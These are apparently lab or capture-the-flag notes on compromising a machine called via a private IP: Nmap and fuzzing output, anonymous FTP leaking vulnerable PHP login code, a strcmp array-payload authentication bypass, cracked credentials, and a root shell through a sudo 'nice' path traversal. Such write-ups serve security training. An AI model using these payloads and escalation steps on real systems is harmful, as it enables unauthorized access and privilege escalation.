# Export
```md
export IP="192.168.237.101"
export URL="http://192.168.237.101:80/FUZZ"
export LIP="192.168.49.237"
```


<hr>

# Loot

#### **Vulnerabilities**

+  Bypass authentication by abusing insecure `strcmp` in `/admin/index.php` !.
	+ Payload: `username=admin&password[]=%22%22`
	+ PoC: https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016
+ `/admin/dashboard.php?page=log` is vulnerable to code injection.


#### **Credentials**

+ Web: `admin:serdesfsefhijosefjtfgyuhjiosefdfthgyjh`
+ Local user: `webadmin:dragon`

#### **Local Enumeration**

+ Local users? `florianges`, `webadmin` 
+ `/etc/passwd` leaks `webadmin` hash password  → Crack with john
+ Can `webadmin` run sudo? YES `(ALL : ALL) /bin/nice /notes/*`

#### **Privilege Escalation**

```bash
$ sudo /bin/nice /notes/../../bin/sh
```

<hr>

# Nmap

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
2112/tcp open  ftp     syn-ack ttl 63 ProFTPD
```

<hr>

# Web Application
### Port 80

+ Discovery:

```md
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 318, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 245, Words: 31, Lines: 9]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10]
```

+ `/admin/index.php` brings us to the admin login page.

<hr>

# FTP
### Port 2112

+ Anonymous login allowed.
+ `index.php.bak` leaks web app login source code.

```md
...

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>

...
```

+ Insecure `strcmp`.